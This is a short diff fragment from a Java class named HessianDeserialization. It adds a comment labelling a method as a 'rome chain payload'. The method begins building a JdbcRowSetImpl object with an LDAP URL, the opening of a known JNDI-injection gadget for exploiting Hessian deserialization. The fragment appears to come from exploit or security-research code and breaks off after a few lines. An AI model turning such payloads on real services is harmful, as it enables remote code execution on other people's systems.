@@ -44,6 +44,12 @@ public class HessianDeserialization {
 		}
 	}
 
+	/**
+	 *  rome链 payload
+	 * @return java.lang.Object
+	 * @throws
+	 * @user
+	 */
 	public static Object getPayload() throws Exception {
 		String         url = "ldap://127.0.0.1:8888";
 		JdbcRowSetImpl rs  = new JdbcRowSetImpl();
